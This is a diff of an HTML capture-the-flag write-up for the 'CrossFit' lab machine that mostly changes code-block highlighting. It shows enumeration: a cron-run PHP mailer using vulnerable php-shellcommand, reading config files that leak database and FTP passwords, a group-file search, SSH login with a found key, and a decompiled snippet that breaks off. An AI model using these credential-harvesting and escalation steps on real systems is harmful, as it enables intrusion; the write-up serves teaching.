+<span class="w">            </span><span class="o">$</span><span class="n">full_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">file_info</span><span class="o">-&gt;</span><span class="n">getPathname</span><span class="p">();</span><span class="w"></span>
+<span class="w">            </span><span class="o">$</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">conn</span><span class="o">-&gt;</span><span class="n">query</span><span class="p">(</span><span class="s1">'SELECT email FROM users'</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="o">$</span><span class="n">row</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">fetch_array</span><span class="p">(</span><span class="n">MYSQLI_ASSOC</span><span class="p">))</span><span class="w"></span>
+<span class="w">            </span><span class="p">{</span><span class="w"></span>
+<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Command</span><span class="p">(</span><span class="s1">'/usr/bin/mail'</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">addArg</span><span class="p">(</span><span class="s1">'-s'</span><span class="p">,</span><span class="w"> </span><span class="s1">'CrossFit Club Newsletter'</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">escape</span><span class="o">=</span><span class="bp">true</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">addArg</span><span class="p">(</span><span class="o">$</span><span class="n">row</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span><span class="w"> </span><span class="o">$</span><span class="n">escape</span><span class="o">=</span><span class="bp">true</span><span class="p">);</span><span class="w"></span>
 
-                $msg = file_get_contents($full_path);
-                $command-&gt;setStdIn('test');
-                $command-&gt;execute();
-            }
-        }
-        unlink($full_path);
-    }
-}
+<span class="w">                </span><span class="o">$</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">full_path</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">setStdIn</span><span class="p">(</span><span class="s1">'test'</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">();</span><span class="w"></span>
+<span class="w">            </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">full_path</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
 
-cleanup();
-?&gt;
+<span class="n">cleanup</span><span class="p">();</span><span class="w"></span>
+<span class="err">?</span><span class="o">&gt;</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  The above PHP code emails files that are uploaded to some message folder to all emails that are stored within a database using
  <a href="https://github.com/mikehaertl/php-shellcommand">
@@ -811,13 +832,15 @@ cleanup();
  </code>
  file.
 </p>
-<pre class="codehilite"><code>hank@crossfit:/home/isaac/send_updates$ cat composer.json
-{
-    "require": {
-        "mikehaertl/php-shellcommand": "1.6.0"
-    }
-}
+<div class="codehilite">
+ <pre><span></span><code><span class="n">hank</span><span class="nv">@crossfit</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">composer</span><span class="p">.</span><span class="n">json</span><span class="w"></span>
+<span class="err">{</span><span class="w"></span>
+<span class="w">    </span><span class="ss">"require"</span><span class="err">:</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">        </span><span class="ss">"mikehaertl/php-shellcommand"</span><span class="err">:</span><span class="w"> </span><span class="ss">"1.6.0"</span><span class="w"></span>
+<span class="w">    </span><span class="err">}</span><span class="w"></span>
+<span class="err">}</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  After some quick googling that I did to learn what the heck this php-shellcommand was, I found out that versions before 1.6.1 were
  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10774">
@@ -870,32 +893,34 @@ cleanup();
  </code>
  .
 </p>
-<pre class="codehilite"><code>hank@crossfit:/home/isaac/send_updates$ cat /etc/crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
+<div class="codehilite">
+ <pre><span></span><code><span class="n">hank</span><span class="nv">@crossfit:</span><span class="sr">/home/is</span><span class="n">aac</span><span class="sr">/send_updates$ cat /</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
+<span class="c1"># /etc/crontab: system-wide crontab</span>
+<span class="c1"># Unlike any other crontab you don't have to run the `crontab'</span>
+<span class="c1"># command to install the new version when you edit this file</span>
+<span class="c1"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c1"># that none of the other crontabs do.</span>
 
-MAILTO=""
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+<span class="n">MAILTO</span><span class="o">=</span><span class="s">""</span>
+<span class="n">SHELL</span><span class="o">=</span><span class="sr">/bin/s</span><span class="n">h</span>
+<span class="n">PATH</span><span class="o">=</span><span class="sr">/usr/</span><span class="nb">local</span><span class="sr">/sbin:/</span><span class="n">usr</span><span class="sr">/local/</span><span class="n">bin:</span><span class="sr">/sbin:/</span><span class="n">bin:</span><span class="sr">/usr/s</span><span class="n">bin:</span><span class="sr">/usr/</span><span class="n">bin</span>
 
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
-*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
-#
+<span class="c1"># Example of job definition:</span>
+<span class="c1"># .---------------- minute (0 - 59)</span>
+<span class="c1"># |  .------------- hour (0 - 23)</span>
+<span class="c1"># |  |  .---------- day of month (1 - 31)</span>
+<span class="c1"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+<span class="c1"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+<span class="c1"># |  |  |  |  |</span>
+<span class="c1"># *  *  *  *  * user-name command to be executed</span>
+<span class="mi">17</span> <span class="o">*</span>    <span class="o">*</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">root</span>    <span class="n">cd</span> <span class="sr">/ &amp;&amp; run-parts --report /</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">hourly</span>
+<span class="mi">25</span> <span class="mi">6</span>    <span class="o">*</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">root</span>    <span class="n">test</span> <span class="o">-</span><span class="n">x</span> <span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span> <span class="o">&amp;&amp;</span> <span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">--</span><span class="n">report</span> <span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">daily</span> <span class="p">)</span>
+<span class="mi">47</span> <span class="mi">6</span>    <span class="o">*</span> <span class="o">*</span> <span class="mi">7</span>   <span class="n">root</span>    <span class="n">test</span> <span class="o">-</span><span class="n">x</span> <span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span> <span class="o">&amp;&amp;</span> <span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">--</span><span class="n">report</span> <span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">weekly</span> <span class="p">)</span>
+<span class="mi">52</span> <span class="mi">6</span>    <span class="mi">1</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">root</span>    <span class="n">test</span> <span class="o">-</span><span class="n">x</span> <span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span> <span class="o">&amp;&amp;</span> <span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">--</span><span class="n">report</span> <span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">monthly</span> <span class="p">)</span>
+<span class="o">*</span>  <span class="o">*</span>    <span class="o">*</span> <span class="o">*</span> <span class="o">*</span>   <span class="n">isaac</span>   <span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/php /</span><span class="n">home</span><span class="sr">/isaac/s</span><span class="n">end_updates</span><span class="o">/</span><span class="n">send_updates</span><span class="o">.</span><span class="n">php</span>
+<span class="c1">#</span>
 </code></pre>
+</div>
 <p>
  <em>
   Nooice
@@ -911,15 +936,17 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 <p>
  Firstly I looked for access to the MySQL server. I remembered from when I was enumerating http://gym-club.crossfit.htb/ that I found a page to sign up to their newsletter. That page indicated to me that the emails are stored in some database. So I took a closer look at the source code for the Gym Club website and found the MySQL credentials I needed.
 </p>
-<pre class="codehilite"><code>hank@crossfit:/var/www/gym-club$ cat db.php
-&lt;?php
-$dbhost = "localhost";
-$dbuser = "crossfit";
-$dbpass = "oeLoo~y2baeni";
-$db = "crossfit";
-$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
-?&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="nx">hank</span><span class="err">@</span><span class="nx">crossfit</span><span class="o">:</span><span class="err">/var/www/gym-club$ cat db.php</span><span class="w"></span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$dbhost</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$dbuser</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
+<span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">"oeLoo~y2baeni"</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <em>
   Noooice
@@ -932,33 +959,35 @@ $conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
  </code>
  , which hank was a member of.
 </p>
-<pre class="codehilite"><code>hank@crossfit:/var/www/gym-club$ find / -group admins -type f 2&gt;/dev/null
-/home/isaac/send_updates/composer.lock
-/home/isaac/send_updates/send_updates.php
-/home/isaac/send_updates/composer.json
-/etc/pam.d/chfn
-/etc/pam.d/newusers
-/etc/pam.d/vmtoolsd
-/etc/pam.d/common-auth
-/etc/pam.d/login
-/etc/pam.d/systemd-user
-/etc/pam.d/runuser-l
-/etc/pam.d/common-account
-/etc/pam.d/vsftpd.orig
-/etc/pam.d/su
-/etc/pam.d/vsftpd
-/etc/pam.d/su-l
-/etc/pam.d/chpasswd
-/etc/pam.d/common-password
-/etc/pam.d/common-session-noninteractive
-/etc/pam.d/sshd
-/etc/pam.d/common-session
-/etc/pam.d/other
-/etc/pam.d/chsh
-/etc/pam.d/passwd
-/etc/pam.d/cron
-/etc/pam.d/runuser
+<div class="codehilite">
+ <pre><span></span><code><span class="n">hank</span><span class="err">@</span><span class="n">crossfit</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">gym</span><span class="o">-</span><span class="n">club</span><span class="o">$</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">group</span><span class="w"> </span><span class="n">admins</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span><span class="w"></span>
+<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">composer</span><span class="o">.</span><span class="n">lock</span><span class="w"></span>
+<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">send_updates</span><span class="o">.</span><span class="n">php</span><span class="w"></span>
+<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">composer</span><span class="o">.</span><span class="n">json</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">chfn</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">newusers</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">vmtoolsd</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">auth</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">login</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">systemd</span><span class="o">-</span><span class="n">user</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">runuser</span><span class="o">-</span><span class="n">l</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">account</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">vsftpd</span><span class="o">.</span><span class="n">orig</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">su</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">vsftpd</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">su</span><span class="o">-</span><span class="n">l</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">chpasswd</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">password</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">session</span><span class="o">-</span><span class="n">noninteractive</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">sshd</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">common</span><span class="o">-</span><span class="n">session</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">other</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">chsh</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">passwd</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">cron</span><span class="w"></span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">runuser</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Very interesting since
  <code>
@@ -970,21 +999,23 @@ $conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
  </code>
  configuration I found some new FTP credentials.
 </p>
-<pre class="codehilite"><code>hank@crossfit:/etc/pam.d$ cat vsftpd
-auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
-account sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
+<div class="codehilite">
+ <pre><span></span><code><span class="n">hank</span><span class="nv">@crossfit</span><span class="err">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">vsftpd</span><span class="w"></span>
+<span class="n">auth</span><span class="w"> </span><span class="n">sufficient</span><span class="w"> </span><span class="n">pam_mysql</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="k">user</span><span class="o">=</span><span class="n">ftpadm</span><span class="w"> </span><span class="n">passwd</span><span class="o">=</span><span class="mi">8</span><span class="n">W</span><span class="p">)</span><span class="err">}</span><span class="n">gpRJvAmnb</span><span class="w"> </span><span class="k">host</span><span class="o">=</span><span class="n">localhost</span><span class="w"> </span><span class="n">db</span><span class="o">=</span><span class="n">ftphosting</span><span class="w"> </span><span class="nc">table</span><span class="o">=</span><span class="n">accounts</span><span class="w"> </span><span class="n">usercolumn</span><span class="o">=</span><span class="n">username</span><span class="w"> </span><span class="n">passwdcolumn</span><span class="o">=</span><span class="n">pass</span><span class="w"> </span><span class="n">crypt</span><span class="o">=</span><span class="mi">3</span><span class="w"></span>
+<span class="n">account</span><span class="w"> </span><span class="n">sufficient</span><span class="w"> </span><span class="n">pam_mysql</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="k">user</span><span class="o">=</span><span class="n">ftpadm</span><span class="w"> </span><span class="n">passwd</span><span class="o">=</span><span class="mi">8</span><span class="n">W</span><span class="p">)</span><span class="err">}</span><span class="n">gpRJvAmnb</span><span class="w"> </span><span class="k">host</span><span class="o">=</span><span class="n">localhost</span><span class="w"> </span><span class="n">db</span><span class="o">=</span><span class="n">ftphosting</span><span class="w"> </span><span class="nc">table</span><span class="o">=</span><span class="n">accounts</span><span class="w"> </span><span class="n">usercolumn</span><span class="o">=</span><span class="n">username</span><span class="w"> </span><span class="n">passwdcolumn</span><span class="o">=</span><span class="n">pass</span><span class="w"> </span><span class="n">crypt</span><span class="o">=</span><span class="mi">3</span><span class="w"></span>
 
-# Standard behaviour for ftpd(8).
-auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed
+<span class="err">#</span><span class="w"> </span><span class="n">Standard</span><span class="w"> </span><span class="n">behaviour</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">ftpd</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="w"></span>
+<span class="n">auth</span><span class="w">    </span><span class="n">required</span><span class="w">        </span><span class="n">pam_listfile</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="n">item</span><span class="o">=</span><span class="k">user</span><span class="w"> </span><span class="n">sense</span><span class="o">=</span><span class="k">deny</span><span class="w"> </span><span class="k">file</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">ftpusers</span><span class="w"> </span><span class="n">onerr</span><span class="o">=</span><span class="n">succeed</span><span class="w"></span>
 
-# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.
+<span class="err">#</span><span class="w"> </span><span class="nl">Note</span><span class="p">:</span><span class="w"> </span><span class="n">vsftpd</span><span class="w"> </span><span class="n">handles</span><span class="w"> </span><span class="n">anonymous</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">own</span><span class="p">.</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">pam_ftp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="w"></span>
 
-# Standard pam includes
-@include common-account
-@include common-session
-@include common-auth
-auth    required        pam_shells.so
+<span class="err">#</span><span class="w"> </span><span class="n">Standard</span><span class="w"> </span><span class="n">pam</span><span class="w"> </span><span class="n">includes</span><span class="w"></span>
+<span class="nv">@include</span><span class="w"> </span><span class="n">common</span><span class="o">-</span><span class="n">account</span><span class="w"></span>
+<span class="nv">@include</span><span class="w"> </span><span class="n">common</span><span class="o">-</span><span class="k">session</span><span class="w"></span>
+<span class="nv">@include</span><span class="w"> </span><span class="n">common</span><span class="o">-</span><span class="n">auth</span><span class="w"></span>
+<span class="n">auth</span><span class="w">    </span><span class="n">required</span><span class="w">        </span><span class="n">pam_shells</span><span class="p">.</span><span class="n">so</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Logging into the FTP server with
  <code>
@@ -1042,22 +1073,24 @@ auth    required        pam_shells.so
  </code>
  so I could SSH in.
 </p>
-<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/crossfit/get_root/ssh_keys$ ssh -i id_rsa isaac@crossfit.htb
-Enter passphrase for key 'id_rsa':
-Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+<div class="codehilite">
+ <pre><span></span><code><span class="n">ghostccamm</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">crossfit</span><span class="o">/</span><span class="n">get_root</span><span class="o">/</span><span class="n">ssh_keys</span><span class="err">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span><span class="w"> </span><span class="n">isaac</span><span class="nv">@crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="n">Enter</span><span class="w"> </span><span class="n">passphrase</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="s1">'id_rsa'</span><span class="err">:</span><span class="w"></span>
+<span class="n">Linux</span><span class="w"> </span><span class="n">crossfit</span><span class="w"> </span><span class="mf">4.19.0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span><span class="w"> </span><span class="n">#1</span><span class="w"> </span><span class="n">SMP</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="mf">4.19.118</span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="p">(</span><span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">29</span><span class="p">)</span><span class="w"> </span><span class="n">x86_64</span><span class="w"></span>
 
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
+<span class="n">The</span><span class="w"> </span><span class="n">programs</span><span class="w"> </span><span class="n">included</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="k">system</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="n">software</span><span class="p">;</span><span class="w"></span>
+<span class="n">the</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">distribution</span><span class="w"> </span><span class="n">terms</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">each</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">described</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"></span>
+<span class="n">individual</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="cm">/*/copyright.</span>
 
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-No mail.
-Last login: Tue May 12 02:53:34 2020 from 10.10.10.2
-isaac@crossfit:~$ id
-uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
-isaac@crossfit:~$
+<span class="cm">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="cm">permitted by applicable law.</span>
+<span class="cm">No mail.</span>
+<span class="cm">Last login: Tue May 12 02:53:34 2020 from 10.10.10.2</span>
+<span class="cm">isaac@crossfit:~$ id</span>
+<span class="cm">uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)</span>
+<span class="cm">isaac@crossfit:~$</span>
 </code></pre>
+</div>
 <p>
  <em>
   Nooooooice
@@ -1066,7 +1099,7 @@ isaac@crossfit:~$
 </div>
 </div>
 </section>
-<section class="wrapper style4 alt">
+<section class="wrapper style3 alt">
 <div class="inner">
 <div class="content">
 
@@ -1096,9 +1129,11 @@ isaac@crossfit:~$
  </code>
  and get a peculiar message indeed...
 </p>
-<pre class="codehilite"><code>isaac@crossfit:~$ /usr/bin/dbmsg
-This program must be run as root.
+<div class="codehilite">
+ <pre><span></span><code><span class="n">isaac</span><span class="nv">@crossfit</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dbmsg</span><span class="w"></span>
+<span class="n">This</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <em>
   Hhhhhhhhhhhhhhmmmmmmmmmmmmmmmmmm
@@ -1186,12 +1221,14 @@ This program must be run as root.
  </em>
  Let's say the messages table has the following row.
 </p>
-<pre class="codehilite"><code>+----+---------+-----------------------+-----------+
-| id | name    | email                 | message   |
-+----+---------+-----------------------+-----------+
-|  1 | someone | someone@somewhere.com | something |
-+----+---------+-----------------------+-----------+
+<div class="codehilite">
+ <pre><span></span><code><span class="nb">+----+---------+-----------------------+-----------+</span><span class="c"></span>
+<span class="c">| id | name    | email                 | message   |</span>
+<span class="nb">+----+---------+-----------------------+-----------+</span><span class="c"></span>
+<span class="c">|  1 | someone | someone@somewhere</span><span class="nt">.</span><span class="c">com | something |</span>
+<span class="nb">+----+---------+-----------------------+-----------+</span><span class="c"></span>
 </code></pre>
+</div>
 <p>
  When
  <code>
@@ -1229,14 +1266,16 @@ This program must be run as root.
 <p>
  Now lets put all of these jigsaw pieces together. One of my goals was to figure out the location where the contents from the query is saved to, which is shown in the following decompiled code snippet.
 </p>
-<pre class="codehilite"><code class="language-c">lVar3 = *local_38;
-uVar2 = rand();
-snprintf(local_c8,0x30,"%d%s",(ulong)uVar2,lVar3);
-sVar5 = strlen(local_c8);
-md5sum(local_c8,sVar5 &amp; 0xffffffff,local_f8,sVar5 &amp; 0xffffffff);
-snprintf(local_98,0x30,"%s%s","/var/local/",local_f8);
-local_40 = fopen(local_98,"w");
+<div class="codehilite">
+ <pre><span></span><code><span class="n">lVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">local_38</span><span class="p">;</span><span class="w"></span>
+<span class="n">uVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">();</span><span class="w"></span>
